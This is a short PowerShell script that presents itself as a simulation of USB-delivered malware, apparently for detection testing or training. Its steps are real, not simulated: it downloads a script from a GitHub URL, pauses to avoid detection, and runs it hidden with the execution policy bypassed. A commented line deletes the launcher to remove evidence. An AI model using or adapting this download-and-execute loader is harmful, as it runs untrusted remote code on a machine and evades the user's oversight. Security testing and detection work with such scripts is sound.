<#
.SYNOPSIS
    Simulates USB-delivered malware using PowerShell.
.DESCRIPTION
    Downloads a fake payload from an external source, waits to mimic stealth, then executes it.
#>

Write-Output "[*] USB device connected. Initializing..."
Start-Sleep -Seconds 5

Write-Output "[*] Downloading external payload to disk..."
Start-Sleep -Seconds 3
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jason-p-nguyen/malware-sim/main/fake-malware.ps1" -OutFile "C:\Temp\payload.ps1"
Write-Output "[+] Payload saved to C:\Temp\payload.ps1"

Write-Output "[*] Waiting to avoid immediate detection..."
Start-Sleep -Seconds 10

Write-Output "[*] Executing payload using PowerShell..."
Start-Sleep -Seconds 2
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Temp\payload.ps1"

Write-Output "[+] Payload launched. Continuing background operations..."
Start-Sleep -Seconds 5

Write-Output "[*] Cleaning up launcher evidence (simulated)..."
Start-Sleep -Seconds 2
# (Optional) Remove-Item -Path $MyInvocation.MyCommand.Path -Force

Write-Output "[âœ“] Simulation complete. USB payload execution mimicked."
